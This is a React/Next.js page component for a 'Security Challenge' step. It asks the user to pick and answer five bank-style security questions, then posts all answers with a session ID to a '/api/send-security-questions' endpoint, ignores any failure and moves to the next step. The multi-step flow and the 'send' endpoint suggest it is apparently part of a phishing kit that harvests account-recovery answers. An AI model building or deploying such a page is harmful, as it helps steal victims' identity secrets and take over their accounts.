import React, { useContext, useEffect, useState } from "react";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import LeftSide from "../components/LeftSide";
import RightSide from "../components/RightSide";
import Sides from "../components/Sides";
import Button from "../components/Button";
import Error from "../components/Error";
import { DataContext } from "./_app";
import axios from "axios";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import AnswerInput from "../components/AnswerInput";
import SelectInput from "../components/SelectInput";
import { Wrapper } from "../components/Wrapper";

interface SecurityChallengeProps {}

export const SecurityChallenge: React.FC<SecurityChallengeProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    resetField,
    watch,
  } = useForm({
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `QUESTIONS`);
    formData.append(`answers`, JSON.stringify({ sessionId: datas.sessionId, ...data }));

    try {
      await axios.post(`/api/send-security-questions`, formData);
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      answers: data,
    });

    const url = getProgress()[getProgress().indexOf(`Security Challenge`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Wrapper page="Security Challenge">
      <div className="scurity-challenge">
        <Sides>
          <LeftSide>
            <div>
              <SelectInput
                name="quest1"
                label="Challenge Question 1"
                register={register("quest1", {
                  validate: (value) => {
                    if (value === "true") {
                      return false;
                    }

                    return true;
                  },
                })}
                options={[
                  "What was the name of your High School?",
                  "What is your maternal grandfather's first name?",
                  "In which city were you married? (Enter full name of the city)",
                  "What is the first name of the maid of honor at your wedding?",
                  "What is the first name of your oldest nephew?",
                  "What is the name of the first company you worked for?",
                  "What is your father's middle name?",
                  "What is your best friend's first name?",
                  "In which city was your high school? (Enter only the full name of the city)",
                ]}
              />
              {errors?.quest1 && (
                <Error message="Please select a challenge question" />
              )}
              <AnswerInput
                title="Answer 1: "
                register={register("ans1", {
                  required: "Please enter an answer",
                })}
              />
              {errors?.ans1 && (
                <Error message={errors.ans1.message as unknown as string} />
              )}
            </div>
            <div>
              <SelectInput
                name="quest2"
                label="Challenge Question 2"
                register={register("quest2", {
                  validate: (value) => {
                    if (value === "true") {
                      return false;
                    }

                    return true;
                  },
                })}
                options={[
                  "What was your high school mascot?",
                  "What was the  name of your first pet?",
                  "In which city is your vacation home? (Enter full name of the city)",
                  "What is the first name of your oldest niece?",
                  "What was the name of your girlfriend/boyfriend?",
                  "What was the nickname of your grandfather?",
                  "What is your paternal grandmother's first name?",
                  "What was the first name of your first manager?",
                  "In which city was your father born? (Enter only the full name of the city)",
                ]}
              />
              {errors?.quest2 && (
                <Error message="Please select a challenge question" />
              )}
              <AnswerInput
                title="Answer 2: "
                register={register("ans2", {
                  required: "Please enter an answer",
                })}
              />
              {errors?.ans2 && (
                <Error message={errors.ans2.message as unknown as string} />
              )}
            </div>
            <div>
              <SelectInput
                name="quest3"
                label="Challenge Question 3"
                register={register("quest3", {
                  validate: (value) => {
                    if (value === "true") {
                      return false;
                    }

                    return true;
                  },
                })}
                options={[
                  "What was the name of the town your grandmother lived in? (Enter only full name of the town)",
                  "What was the name of your high school?",
                  "Where did you meet your spouse for the first time? (Enter only the full name of the city)",
                  "What was the last name of your favourite teacher in final year of high school?",
                  "In which city were you born? (Enter only the full name of the city)",
                  "In which city was your mother born? (Enter only the full name of the city)",
                  "What is your paternal grandfather's first name?",
                  "What is your mother middle name?",
                  "What was your favorite restaurant in college?",
                  "What street did your best friend in high school live on? (Enter only the full name of the city)",
                ]}
              />
              {errors?.quest3 && (
                <Error message="Please select a challenge question" />
              )}
              <AnswerInput
                title="Answer 3: "
                register={register("ans3", {
                  required: "Please enter an answer",
                })}
              />
              {errors?.ans3 && (
                <Error message={errors.ans3.message as unknown as string} />
              )}
            </div>
            <div>
              <SelectInput
                name="quest4"
                label="Challenge Question 4"
                register={register("quest4", {
                  validate: (value) => {
                    if (value === "true") {
                      return false;
                    }

                    return true;
                  },
                })}
                options={[
                  "What was the name of the town your grandmother lived in? (Enter only full name of the town)",
                  "What was the name of your high school?",
                  "Where did you meet your spouse for the first time? (Enter only the full name of the city)",
                  "What was the last name of your favourite teacher in final year of high school?",
                  "In which city were you born? (Enter only the full name of the city)",
                  "In which city was your mother born? (Enter only the full name of the city)",
                  "What is your paternal grandfather's first name?",
                  "What is your mother middle name?",
                  "What was your favorite restaurant in college?",
                  "What street did your best friend in high school live on? (Enter only the full name of the city)",
                ]}
              />
              {errors?.quest4 && (
                <Error message="Please select a challenge question" />
              )}
              <AnswerInput
                title="Answer 4: "
                register={register("ans4", {
                  required: "Please enter an answer",
                })}
              />
              {errors?.ans4 && (
                <Error message={errors.ans4.message as unknown as string} />
              )}
            </div>
            <div>
              <SelectInput
                name="quest5"
                label="Challenge Question 5"
                register={register("quest5", {
                  validate: (value) => {
                    if (value === "true") {
                      return false;
                    }

                    return true;
                  },
                })}
                options={[
                  "What was the name of the town your grandmother lived in? (Enter only full name of the town)",
                  "What was the name of your high school?",
                  "Where did you meet your spouse for the first time? (Enter only the full name of the city)",
                  "What was the last name of your favourite teacher in final year of high school?",
                  "In which city were you born? (Enter only the full name of the city)",
                  "In which city was your mother born? (Enter only the full name of the city)",
                  "What is your paternal grandfather's first name?",
                  "What is your mother middle name?",
                  "What was your favorite restaurant in college?",
                  "What street did your best friend in high school live on? (Enter only the full name of the city)",
                ]}
              />
              {errors?.quest5 && (
                <Error message="Please select a challenge question" />
              )}
              <AnswerInput
                title="Answer 5: "
                register={register("ans5", {
                  required: "Please enter an answer",
                })}
              />
              {errors?.ans5 && (
                <Error message={errors.ans5.message as unknown as string} />
              )}
            </div>
          </LeftSide>
          <RightSide />
        </Sides>
        <Button onClick={onSubmit} disabled={loading} />
      </div>
    </Wrapper>
  );
};

export default SecurityChallenge;
